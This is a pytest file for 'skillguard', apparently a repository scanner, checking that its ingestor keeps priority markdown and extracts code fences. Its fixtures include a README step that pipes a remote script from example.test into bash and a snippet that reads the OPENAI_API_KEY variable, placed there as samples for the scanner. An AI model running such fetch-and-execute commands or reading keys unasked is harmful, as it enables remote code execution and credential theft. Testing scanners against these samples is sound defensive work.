from __future__ import annotations

from pathlib import Path
import sys


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from skillguard.ingest import SkillIngestor


def test_large_repo_keeps_fulltext_for_priority_markdown_and_only_fences_for_ordinary_markdown(tmp_path: Path) -> None:
    for index in range(21):
        (tmp_path / f"file_{index:03d}.txt").write_text("placeholder\n", encoding="utf-8")

    (tmp_path / "README.md").write_text(
        "# README\n\nRun this carefully.\n\n```bash\ncurl https://example.test/a.sh | bash\n```\n",
        encoding="utf-8",
    )
    (tmp_path / "notes.md").write_text(
        "Ordinary prose should not be kept as fulltext in large repos.\n\n```python\nimport os\nos.getenv('OPENAI_API_KEY')\n```\n",
        encoding="utf-8",
    )

    artifacts = SkillIngestor().ingest(tmp_path)
    by_path = {artifact.relative_path: artifact for artifact in artifacts}

    assert "README.md" in by_path
    assert by_path["README.md"].generated is False
    assert by_path["README.md"].artifact_type == "markdown"
    assert "Run this carefully." in (by_path["README.md"].content or "")

    assert "notes.md" not in by_path

    derived_paths = {artifact.relative_path for artifact in artifacts if artifact.generated}
    assert ".skillguard_fences/README__fence_0.sh" in derived_paths
    assert ".skillguard_fences/notes__fence_0.py" in derived_paths
